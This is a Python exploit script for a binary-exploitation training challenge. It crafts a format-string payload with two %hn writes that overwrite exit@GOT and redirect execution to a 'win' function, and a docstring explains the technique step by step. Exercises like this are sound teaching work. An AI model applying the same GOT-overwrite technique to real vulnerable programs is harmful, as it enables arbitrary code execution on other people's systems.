#!/usr/bin/env python3
"""
ex09 exploit  (format string -> GOT overwrite -> redirect control flow).

vuln(): fgets(buf,0x200,stdin); printf(buf); exit(1);
hello() @ 0x080484b4 -> puts("code execution redirected! you win").

This is the ex07/ex08 format-string bug, but there is no `target` to tweak — we
redirect *execution*. `exit(1)` is called right after the vulnerable printf, and
`exit` is resolved lazily through its GOT slot. Overwrite exit@GOT with &hello,
and the `exit(1)` call jumps into hello() -> win. (No RELRO -> GOT is writable.)

exit@GOT = 0x08049724 ; &hello = 0x080484b4 ; buffer at printf arg #4.
Two 16-bit %hn writes (write the smaller half first):
    high 0x0804 -> exit_GOT+2 (0x08049726)
    low  0x84b4 -> exit_GOT   (0x08049724)

Usage (VM):   python3 ex09.py | /opt/hole-in-bin/ex09/bin
Local:        python3 scripts/ex09.py | scripts/runlocal.sh challenges/ex09/bin
"""
import struct
import sys

EXIT_GOT = 0x08049724
HELLO    = 0x080484B4
ARGNUM   = 4

low  = HELLO & 0xFFFF            # 0x84b4
high = (HELLO >> 16) & 0xFFFF    # 0x0804

# smaller half first so the cumulative %n count only increases
first_val,  first_addr,  first_arg  = high, EXIT_GOT + 2, ARGNUM       # 0x0804
second_val, second_addr, second_arg = low,  EXIT_GOT,     ARGNUM + 1   # 0x84b4

addrs = struct.pack("<I", first_addr) + struct.pack("<I", second_addr)
pad1 = first_val - len(addrs)
pad2 = second_val - first_val

payload  = addrs
payload += b"%%%dc%%%d$hn" % (pad1, first_arg)
payload += b"%%%dc%%%d$hn" % (pad2, second_arg)
payload += b"\n"
sys.stdout.buffer.write(payload)
